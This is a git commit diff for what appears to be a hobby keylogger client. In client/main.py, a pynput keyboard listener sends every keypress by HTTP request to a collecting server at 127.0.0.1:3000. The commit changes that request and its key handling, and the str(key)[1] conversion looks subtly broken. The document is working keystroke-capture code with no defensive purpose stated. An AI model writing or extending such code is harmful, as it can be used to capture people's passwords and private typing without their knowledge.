e87de1ba99fde4a9b9a5aaadb6fdb32afe31d855
Kai Daniel Gonzalez <gkai70264@gmail.com>
2023-01-08 21:30:29 -0500

    Update for Windows support (a majority)

--- client/main.py
+++ client/main.py
@@ -2,7 +2,7 @@ from pynput.keyboard import Key, Listener
 import requests
 
 def on_press(key):
-    requests.get("127.0.0.1:3000/key/" + key)
+    requests.get("http://127.0.0.1:3000/key/" + str(key)[1])
 
 with Listener(on_press=on_press) as listener :
     listener.join()
